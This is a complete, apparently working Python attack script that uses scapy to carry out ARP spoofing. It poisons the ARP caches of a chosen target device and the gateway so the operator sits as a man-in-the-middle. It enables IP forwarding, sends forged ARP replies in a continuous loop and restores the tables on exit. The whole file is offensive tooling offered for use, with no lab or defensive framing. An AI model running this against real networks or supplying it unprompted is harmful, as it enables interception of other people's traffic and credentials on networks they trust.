#!/usr/bin/env python3

import time
import sys
import datetime as dt
import requests
import subprocess
from argparse import ArgumentParser
import scapy.all as scapy

if sys.version_info < (3, 0):
    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
    sys.stderr.write(
        "Please update and make sure you use the command python3 arp_spoof.py -t <target_ip> -g <gateway_ip>\n\n")
    sys.exit(0)


def args():
    parser = ArgumentParser(description="------- A Tool to Perform ARP Spoofing to be MITM -------")
    parser.add_argument("-t", "--target", dest="target_address", help="Specify the IP address for your target device. "
                                                                      "Example: --target 192.168.1.7")
    parser.add_argument("-g", "--gateway", dest="gateway_address",
                        help="Specify the IP address of the gateway to spoof. Example: --gateway 192.168.1.1")
    options = parser.parse_args()
    if not options.target_address:
        parser.error("[-] Please specify the target IP address, or type it correctly, ex: -t 192.168.1.8")
    elif not options.gateway_address:
        parser.error("[-] Please specify the gateway IP address, or type it correctly, ex: -g 192.168.1.1")
    return options


def fetch_mac_address(ip_address, timeout=7):
    arp_request = scapy.ARP(pdst=ip_address)  # create an ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # broadcast an ARP packets to all devices in the network
    broadcast_arp_packets = broadcast / arp_request  # combining these 2 packets together to send

    answered, unanswered = scapy.srp(broadcast_arp_packets, timeout=timeout,
                                     verbose=False)  # send packets to all devices

    # extracting information from answered packets
    devices_mac_list = []
    for sent_packet, received_packet in answered:
        # check if the packet contains an ARP layer
        if scapy.ARP in received_packet:
            device_info = {"mac": received_packet[scapy.Ether].src}  # get the size of the packet
            devices_mac_list.append(device_info)

    return devices_mac_list


def fetch_mac_vendor(ip_address):
    return \
        requests.get(url="https://www.macvendorlookup.com/api/v2/" + fetch_mac_address(ip_address=ip_address)[0]["mac"],
                     timeout=7).json()[0]["company"]


def spoof(target_ip, spoof_ip):
    target_mac_address = fetch_mac_address(ip_address=target_ip)[0]["mac"]
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address,
                             psrc=spoof_ip)  # op=2 telling scapy to send ARP response, pdst=<target_ip>,
    # hwdst=<target_mac>, psrc=<gateway_ip> (false information)
    scapy.send(arp_response, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac_address = fetch_mac_address(ip_address=destination_ip)[0]["mac"]
    source_mac_address = fetch_mac_address(ip_address=source_ip)[0]["mac"]
    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
                             hwsrc=source_mac_address)
    scapy.send(arp_response, verbose=False, count=4)  # count=4 sent this packet 4 times


option = args()
target_ip_address = option.target_address
gateway_ip_address = option.gateway_address

packets_counter = 0
try:
    client_response = fetch_mac_vendor(ip_address=target_ip_address)
    router_response = fetch_mac_vendor(ip_address=gateway_ip_address)
    print("\n" + str(dt.datetime.now().strftime("%b %d, %Y %H:%M:%S %p")))
    print("===========================================")
    print("* Target Device " + target_ip_address + " (" + client_response + ")")
    print("* Target Router " + gateway_ip_address + " (" + router_response + ")")
    print("===========================================")
    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward",
                    shell=True)  # allow the packets to flow through our machine (security feature in kali linux)
    print("[+] Successful enabled IP forwarding..")
    while True:
        spoof(target_ip=target_ip_address, spoof_ip=gateway_ip_address)  # first packet goes to the client
        spoof(target_ip=gateway_ip_address, spoof_ip=target_ip_address)  # second packet goes to the router
        packets_counter += 2
        print("\r[+] Sent " + str(packets_counter) + " ARP Spoofed Packets.", end='')
        time.sleep(1.7)
except KeyboardInterrupt:
    print("\n===========================================")
    print("[*] Detected 'ctrl + c' pressed, program terminated.")
    print("[*] Cleaning up and re-arping targets...\n")
    for _ in range(3):
        restore(destination_ip=target_ip_address, source_ip=gateway_ip_address)
    sys.exit(0)
